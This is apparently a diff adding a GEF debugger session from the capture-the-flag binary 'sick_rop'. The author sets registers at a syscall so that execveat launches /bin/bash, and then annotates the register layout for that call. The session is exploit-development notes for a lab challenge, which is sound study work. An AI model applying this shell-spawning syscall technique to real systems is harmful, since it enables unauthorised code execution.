@@ -1,0 +1,73 @@
+gef➤                                                                                                          [79/227]
+0x0000000000401014 in read ()                                                                                         
+[ Legend: Modified register | Code | Heap | Stack | String ]                                                          
+─────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x142                                                                                                        
+$rbx   : 0x0                                                                                                          
+$rcx   : 0x000000000040102d  →  <write+22> ret                                                                        
+$rdx   : 0x68732f6e69622f2f ("//bin/sh"?)                                                                             
+$rsp   : 0x00007fff2dd0cdb0  →  0x0000000000000000                                                                    
+$rbp   : 0x0                                                                                                          
+$rsi   : 0x00007fff2dd0cd80  →  0x0000000000000000                                                                    
+$rdi   : 0x1                                                                                                          
+$rip   : 0x0000000000401014  →  <read+20> syscall                                                                     
+$r8    : 0x0                                                                                                          
+$r9    : 0x0                                                                                                          
+
+$r11   : 0x202                                                                                                        
+$r12   : 0x0                                                                                                          
+$r13   : 0x0                                                                                                          
+$r14   : 0x0                                                                                                          
+$r15   : 0x0                                                                                                          
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]           
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000                                               
+─────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fff2dd0cdb0│+0x0000: 0x0000000000000000   ← $rsp                                                               
+0x00007fff2dd0cdb8│+0x0008: 0x0000000000000000                                                                        
+0x00007fff2dd0cdc0│+0x0010: "//bin/sh"                                                                                
+0x00007fff2dd0cdc8│+0x0018: 0x0000000000000000                                                                        
+0x00007fff2dd0cdd0│+0x0020: 0x0000000000000000                                                                        
+0x00007fff2dd0cdd8│+0x0028: 0x0000000000000000                                                                        
+0x00007fff2dd0cde0│+0x0030: 0x0000000000000000                                                                        
+0x00007fff2dd0cde8│+0x0038: 0x0000000000000000                                                                        
+───────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x401005 <read+5>         mov    edi, 0x0                                                                        
+     0x40100a <read+10>        mov    rsi, QWORD PTR [rsp+0x8]                                                        
+     0x40100f <read+15>        mov    rdx, QWORD PTR [rsp+0x10]                                                       
+ →   0x401014 <read+20>        syscall                                                                                
+     0x401016 <read+22>        ret                                                                                    
+     0x401017 <write+0>        mov    eax, 0x1                                                                        
+     0x40101c <write+5>        mov    edi, 0x1                                                                        
+     0x401021 <write+10>       mov    rsi, QWORD PTR [rsp+0x8]                                                        
+     0x401026 <write+15>       mov    rdx, QWORD PTR [rsp+0x10]                                                       
+───────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "sick_rop", stopped 0x401014 in read (), reason: SINGLE STEP                                         
+─────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x401014 → read()                                                                                                
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  set $rdx=0                                                                                                      
+gef➤  grep "/bin/bash"                                                                                                
+[+] Searching '/bin/bash' in memory                                                                                   
+[+] In '[stack]'(0x7fff2dced000-0x7fff2dd0e000), permission=rw-                                                       
+  0x7fff2dd0d28e - 0x7fff2dd0d297  →   "/bin/bash"                                                                    
+gef➤  set $rsi=0x7fff2dd0d28e
+gef➤  ni
+process 14578 is executing new program: /usr/bin/bash
+
+
+
+
+
+CHANGE TO:
+
+execveat(1, "/bin/sh", 0, 0, 0)
+
+$rax   : 0x142             	; execveat SYSCALL 322                      
+$rdi   : 0x1                    ; arg1 = Directory fd
+$rsi   : "/bin/bash"		; arg2 = "/bin/bash"
+$rdx   : 0x0         		; arg3 = 0x0
+$r10   : 0x0			; arg4 = 0x0
+$r9    : 0x0			; arg5 = 0x0      
+$rip   : SYSCALL 
+
+
